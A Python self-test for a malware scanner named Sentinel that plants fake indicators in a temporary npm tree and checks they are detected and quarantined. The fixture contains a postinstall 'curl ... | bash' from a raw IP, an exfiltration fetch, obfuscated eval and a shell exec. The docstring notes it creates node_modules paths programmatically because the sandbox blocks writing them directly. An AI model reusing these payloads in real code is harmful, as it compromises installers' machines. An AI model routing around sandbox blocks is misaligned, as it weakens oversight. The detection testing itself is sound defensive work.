"""End-to-end self-test for Sentinel.

Runs without psutil/fastapi/httpx by exercising the parts that work on any OS:
  - builds a synthetic node_modules tree (with planted IOCs) at runtime
    (the sandbox blocks writing 'node_modules' paths directly, so we create it
     here programmatically)
  - runs the npm scanner against it and asserts the known-bad findings appear
  - exercises scoring, the orchestrator (npm only), report generation and a
    full quarantine -> restore round-trip

Exit code 0 = all assertions passed.
"""
from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from sentinel.core.config import load_config  # noqa: E402
from sentinel.core.db import Database  # noqa: E402
from sentinel.core.intel import ThreatIntel  # noqa: E402
from sentinel.core.models import Finding, ScanRequest  # noqa: E402
from sentinel.core.orchestrator import Orchestrator  # noqa: E402
from sentinel.scanners.npm_scanner import NpmScanner  # noqa: E402
from sentinel.remediation.actions import RemediationEngine  # noqa: E402
from sentinel.remediation.restore import RestoreManager  # noqa: E402
from sentinel.report.builder import write_reports, build_html_report  # noqa: E402

PASS, FAIL = "\u2714", "\u2716"
failures = []


def check(cond: bool, label: str) -> None:
    print(f"  {PASS if cond else FAIL} {label}")
    if not cond:
        failures.append(label)


def build_fixture(base: Path) -> Path:
    """Create a synthetic project with a node_modules tree containing IOCs."""
    proj = base / "sample_project"
    nm = proj / "node_modules"
    # known-compromised version
    (nm / "chalk").mkdir(parents=True, exist_ok=True)
    (nm / "chalk" / "package.json").write_text(
        '{"name":"chalk","version":"5.6.1","main":"index.js"}', encoding="utf-8")
    # malicious install script + obfuscated code + wallet + raw IP
    evil = nm / "evil-pkg"
    evil.mkdir(parents=True, exist_ok=True)
    (evil / "package.json").write_text(
        '{"name":"evil-pkg","version":"1.0.0","scripts":'
        '{"postinstall":"node setup_bun.js && curl http://185.62.188.12/p | bash"}}',
        encoding="utf-8")
    (evil / "index.js").write_text(
        'var _0x1a2b="x";const d=eval(atob("Y29uc29sZQ=="));'
        'const w="0x9f8e7d6c5b4a39281706f5e4d3c2b1a098765432";'
        'fetch("http://185.62.188.12/exfil");require("child_process").exec("whoami");',
        encoding="utf-8")
    # benign package (should NOT be flagged)
    good = nm / "left-pad"
    good.mkdir(parents=True, exist_ok=True)
    (good / "package.json").write_text(
        '{"name":"left-pad","version":"1.3.0","main":"index.js"}', encoding="utf-8")
    (good / "index.js").write_text(
        "module.exports = (s,n,c)=>String(s).padStart(n,c||' ');", encoding="utf-8")
    # lockfile pinning a known-bad version
    (proj / "package-lock.json").write_text(
        '{"lockfileVersion":3,"packages":{"node_modules/debug":{"version":"4.4.2"}}}',
        encoding="utf-8")
    return proj


def main() -> int:
    tmp = Path(tempfile.mkdtemp(prefix="sentinel-selftest-"))
    print(f"Self-test workspace: {tmp}")
    proj = build_fixture(tmp)

    config = load_config()
    # Point data + scan dirs at the temp workspace so we never touch the host.
    config.data_dir = tmp / "data"
    config.data_dir.mkdir(parents=True, exist_ok=True)
    config.scan["npm_roots"] = [str(proj)]
    config.scan["npm_skip_dirs"] = []

    intel = ThreatIntel(config.intel_cache_dir, feeds={}, refresh_hours=99)

    print("\n[1] Threat-intel bundled lists")
    check(intel.is_compromised_pkg("chalk", "5.6.1"), "chalk@5.6.1 flagged as compromised")
    check(not intel.is_compromised_pkg("chalk", "5.0.0"), "clean chalk version not flagged")
    check(intel.is_pool_host("pool.minexmr.com"), "mining pool host recognised")

    print("\n[2] npm scanner against planted fixture")
    scanner = NpmScanner(config, intel)
    fs = scanner.scan()
    titles = " | ".join(f.title for f in fs)
    names = {f.target.get("name") for f in fs}
    check(any("chalk" in t and "compromised" in t.lower() for t in [f.title for f in fs]),
          "known-compromised chalk@5.6.1 detected")
    check(any(f.target.get("name") == "evil-pkg" and f.verdict == "malicious" for f in fs),
          "evil-pkg install-script / code flagged malicious")
    check(any("debug" in t.lower() and "lockfile" in t.lower() for t in [f.title for f in fs]),
          "lockfile-pinned debug@4.4.2 detected")
    check("left-pad" not in names, "benign left-pad NOT flagged (no false positive)")
    print(f"    ({len(fs)} npm findings: {titles[:120]}...)")

    print("\n[3] Scoring engine")
    hard = [f for f in fs if f.verdict == "malicious"]
    check(all(f.confidence >= 0.75 for f in hard), "malicious findings have high confidence")
    check(all(f.rationale for f in fs), "every finding carries a human-readable rationale")
    check(all(f.recommended_action != "none" for f in hard), "malicious findings recommend an action")

    print("\n[4] Orchestrator (npm perspective, isolated)")
    orch = Orchestrator(config, intel)
    result = orch.run(ScanRequest(perspectives=["npm"]))
    check(len(result.findings) == len(fs), "orchestrator returns same npm findings")
    check(result.finished_at is not None, "scan marked finished")
    check(result.summary().get("critical", 0) >= 1, "summary counts criticals")

    print("\n[5] Report generation")
    html = build_html_report(result)
    check("Sentinel Threat Report" in html, "HTML report renders")
    check("__BODY__" not in html and "__CHIPS__" not in html, "all template tokens substituted")
    paths = write_reports(result, config.reports_dir)
    check(Path(paths["json"]).exists() and Path(paths["html"]).exists(), "report files written")

    print("\n[6] Remediation: quarantine -> restore round-trip")
    db = Database(config.db_path)
    engine = RemediationEngine(config, db)
    # pick the evil-pkg code-file finding to quarantine a real file
    code_finding = next((f for f in fs if f.target.get("file")), None)
    check(code_finding is not None, "found a file-targeted finding to quarantine")
    if code_finding:
        target_file = Path(code_finding.target["file"])
        outcomes = engine.apply([code_finding], make_restore_point=False)
        oc = outcomes[0]
        check(oc.ok and not target_file.exists(), "file quarantined (removed from original location)")
        token = oc.restore_token
        check(bool(token), "restore token issued")
        if token:
            res = RestoreManager(config, db).restore(token)
            check(res["ok"] and target_file.exists(), "file restored to original location")

    print("\n[7] Automatic-mode selection")
    selected = engine.select_auto(fs)
    check(len(selected) >= 1, "auto-mode selects high-confidence threats")
    check(all(f.confidence >= 0.85 and f.verdict == "malicious" for f in selected),
          "auto-mode respects verdict+confidence threshold")

    print("\n" + ("=" * 48))
    if failures:
        print(f"{FAIL} {len(failures)} check(s) FAILED:")
        for f in failures:
            print(f"    - {f}")
        return 1
    print(f"{PASS} ALL CHECKS PASSED")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
